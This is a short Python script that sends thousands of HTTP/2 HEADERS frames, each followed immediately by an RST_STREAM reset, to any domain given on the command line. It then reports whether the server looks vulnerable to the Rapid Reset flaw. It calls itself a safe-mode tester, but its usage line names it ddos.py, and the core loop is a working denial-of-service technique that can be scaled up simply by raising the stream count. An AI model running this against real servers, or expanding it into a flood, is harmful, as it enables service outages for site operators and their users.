import socket
import ssl
import h2.connection
import h2.events
import sys

def test_rapid_reset(target_host, target_port=443, num_streams=5000):
    print(f"[*] Testing {target_host} for HTTP/2 Rapid Reset (Safe Mode: {num_streams} streams)")
    
    # Establish TCP connection
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    try:
        sock = socket.create_connection((target_host, target_port), timeout=10)
        tls_sock = ctx.wrap_socket(sock, server_hostname=target_host)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    # Ensure HTTP/2 was negotiated
    if tls_sock.selected_alpn_protocol() != 'h2':
        print("[-] Server did not negotiate HTTP/2.")
        return

    print("[+] HTTP/2 Negotiated successfully.")

    # Initialize H2 connection
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())

    # Send rapid HEADERS followed immediately by RST_STREAM
    for i in range(num_streams):
        stream_id = conn.get_next_available_stream_id()
        headers = [
            (':method', 'GET'),
            (':authority', target_host),
            (':scheme', 'https'),
            (':path', '/'),
        ]
        
        # Send the request
        conn.send_headers(stream_id, headers)
        # Immediately reset the stream (The core of the vulnerability)
        conn.reset_stream(stream_id, error_code=h2.errors.ErrorCodes.CANCEL)
    
    tls_sock.sendall(conn.data_to_send())
    print(f"[+] Sent {num_streams} rapid HEADERS + RST_STREAM frames.")

    # Check if server keeps connection alive (Vulnerable behavior)
    try:
        tls_sock.settimeout(5)
        data = tls_sock.recv(65535)
        events = conn.receive_data(data)
        
        server_closed = False
        for event in events:
            if isinstance(event, h2.events.ConnectionTerminated):
                server_closed = True
                print("[!] Server safely terminated the connection (Mitigated).")
                break
        
        if not server_closed:
            print("[!!!] Server kept connection alive after rapid resets.")
            print("[!!!] VULNERABLE: Server does not enforce RST_STREAM rate limits.")
            
    except socket.timeout:
        print("[!!!] Server timed out (Connection still open).")
        print("[!!!] VULNERABLE: Server does not enforce RST_STREAM rate limits.")
    except Exception as e:
        print(f"[-] Connection closed/dropped by server: {e}")

    tls_sock.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 ddos.py <target_domain>")
    else:
        # Strip https:// if user provides it by mistake
        target = sys.argv[1].replace("https://", "").replace("http://", "").split("/")[0]
        test_rapid_reset(target)
